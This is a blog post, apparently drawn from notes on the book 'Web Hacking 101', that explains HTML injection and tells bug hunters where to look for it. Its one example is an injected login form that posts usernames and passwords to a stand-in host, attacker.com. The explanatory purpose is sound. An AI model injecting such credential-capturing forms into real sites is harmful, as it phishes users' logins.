---
title: HTML Injection
date: '2019-02-14'
time: '☕️'
template: "post"
draft: false
slug: "HTML-vulnerability"
category: "Cybersecurity"
tags:
  - "Cybersecurity"
description: "HTML injection is also sometimes referred to as virtual
defacement. This is really an attack made possible by a site allowing a malicious user to
inject HTML into its web page(s) by not handling a user’s input properly."
---

This article was done using my notes from a book titled WEB Hacking 101 written by Peter Yaworksi in 2018.

<sub>Yaworksi P. (2018). Web Hacking 101, How To Make Money Hacking Ethically</sub>

## What are HTML injections ?

As said in the summary, Hypertext Markup Language (HTML) injection is also sometimes referred to as virtual
defacement. This attack made possible by a site allowing an attacker to inject HTML into its web page(s) by not handling a user’s input properly.

In other words, an HTML injection vulnerability is caused by receiving HTML, typically via some form
input, which is then rendered as inputted, on the web page.

Since HTML is the language used to define the structure of a web page, if an attacker can
inject HTML, they can essentially change what a browser renders and a web page looks
like.

Sometimes this could result in completely changing the look of a page or in other
cases, creating HTML forms to trick users in hope they use the form to submit sensitive
information (this is referred to as phishing).

For example, if you could inject HTML, you might be able to add a < form> tag to the page, asking the user to re-enter their username
and password like:

```
<form method='POST' action='http://attacker.com/capture.php' id="login-form">
<input type='text' name='username' value=''>
<input type='password' name='password' value=''>
<input type='submit' value='submit'>
</form>

```

However, when submitting this form, the information is actually sent to http://attacker.com
via an action attribute, which sends the information to an attacker’s web page.

## What to be on the look out for ?

HTML Injection presents a vulnerability for sites and developers because it can be used to
phish users and trick them into submitting sensitive information to, or visiting, malicious
websites.

Hackers should be on the lookout for the opportunity to manipulate URL parameters and have
them rendered on the site but keep in mind, not all sites value and pay for these types
of reports.
